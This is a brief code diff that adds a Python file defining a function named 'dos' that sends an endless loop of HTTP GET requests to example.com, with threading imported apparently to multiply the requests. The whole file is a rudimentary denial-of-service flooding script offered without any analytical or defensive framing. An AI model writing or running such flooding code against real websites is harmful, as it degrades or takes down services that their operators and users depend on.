@@ -1,0 +1,11 @@
+# coding: utf8
+import threading
+import requests
+
+
+def dos():
+    while True:
+        requests.get("http://example.com")
+
+
+
